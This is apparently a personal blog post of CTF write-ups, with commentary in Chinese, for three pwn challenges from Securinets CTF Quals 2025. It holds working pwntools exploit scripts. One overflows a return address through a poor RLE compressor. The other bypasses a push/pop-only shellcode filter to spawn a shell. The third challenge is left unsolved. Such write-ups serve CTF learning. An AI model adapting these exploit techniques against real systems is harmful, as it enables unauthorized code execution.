---
title: "Write-ups: Securinets CTF Quals 2025"
published: 2025-10-04
updated: 2025-10-06
description: "Write-ups for Securinets CTF Quals 2025 pwn aspect."
tags: ["Pwn", "Write-ups"]
category: "Write-ups"
draft: false
---

# zip++

## Information

- Category: Pwn
- Points: 500

## Description

> why isn't my compressor compressing ?!

## Write-up

问 AI，得知 `compress` 函数实现了一个 `RLE (Run-Length Encoding)` 压缩算法，压缩后格式为 `[字节 1][重复次数 1][字节 2][重复次数 2]...`，因此如果我们输入交替字符就会导致压缩率很差，溢出返回地址。

## Exploit

```python
#!/usr/bin/env python3

from pwn import (
    ELF,
    args,
    context,
    flat,
    process,
    raw_input,
    remote,
)


FILE = "./main"
HOST, PORT = "pwn-14caf623.p1.securinets.tn", 9000

context(log_level="debug", binary=FILE, terminal="kitty")

elf = context.binary


def launch():
    global target
    if args.L:
        target = process(FILE)
    else:
        target = remote(HOST, PORT)


def main():
    launch()

    payload = flat(
        b"AB" * 0xC6,
        b"\xa6" * 0x11,
    )
    raw_input("DEBUG")
    target.sendafter(b"data to compress :", payload)
    raw_input("DEBUG")
    target.sendline(b"exit")

    target.interactive()


if __name__ == "__main__":
    main()
```

## Flag

:spoiler[`Securinets{my_zip_doesnt_zip}`]

# push pull pops

## Information

- Category: Pwn
- Points: 500

## Description

> Shellcoding in the big 25 😱

## Write-up

有意思，第一次见 python 写的 pwn 题，这题只允许使用 `push`, `pop` 和 `int 3` 指令，但是测试发现非法指令会导致 capstone 直接返回 None，使得后面的指令不会被检查，那我们只要栈迁移到 mmap 出来的地方，然后 nop sled 到 shellcode 就好了。

祭出指令表：[X86 Opcode and Instruction Reference Home](http://ref.x86asm.net/coder64.html)

## Exploit

```python
#!/usr/bin/env python3

from pwn import (
    ELF,
    args,
    asm,
    b64e,
    context,
    disasm,
    flat,
    process,
    raw_input,
    remote,
    shellcraft,
)


FILE = "./main.py"
HOST, PORT = "pwn-14caf623.p1.securinets.tn", 9001

# context(log_level="debug", binary=FILE, terminal="kitty")
context(log_level="debug", terminal="kitty", arch="amd64")

elf = context.binary


def launch():
    global target
    if args.L:
        target = process(["python3", FILE])
        # gdb.attach(target, gdbscript=gdbscript)
    else:
        target = remote(HOST, PORT)


def main():
    launch()

    payload_1 = asm(
        """
        push r11
        pop rsp
        pop r15
        pop r15
        pop r15
        pop r15
        push r15
        push r15
        push r15
        """
    )

    payload_2 = b"\x06" + b"\x90" * 0x10 + asm("add rsp, 0x100") + asm(shellcraft.sh())
    target.success(disasm(payload_1))
    target.success(disasm(asm("add rsp, 0x100")))
    target.success(disasm(asm(shellcraft.sh())))
    raw_input("DEBUG")
    target.sendafter(b"Shellcode : ", b64e(payload_1 + payload_2))

    target.interactive()


if __name__ == "__main__":
    main()
```

## Flag

:spoiler[`Securinets{push_pop_to_hero}`]

# push pull pops REVENGE

## Information

- Category: Pwn
- Points: 500

## Description

> you aint getting away with it , not on my watch .

## Write-up

这次题目加了输入和解码出来的指令之间的长度检测：

```python
if code_len != decoded:
    print("nice try")
    return False
```

那就把非法指令 ban 掉了，测试使用 semantically equivalent encodings 也没啥用，绕不开这个长度检测。

最后思路是自己构造一个 syscall，然后调用 read，这样就可以把 shellcode 读进去，不被过滤。

但是但是，我没做出来 :sob: 所以等有时间了再去复现一下吧，得学习一下怎么自己构造 syscall……

## Exploit

TODO

## Flag

复现。
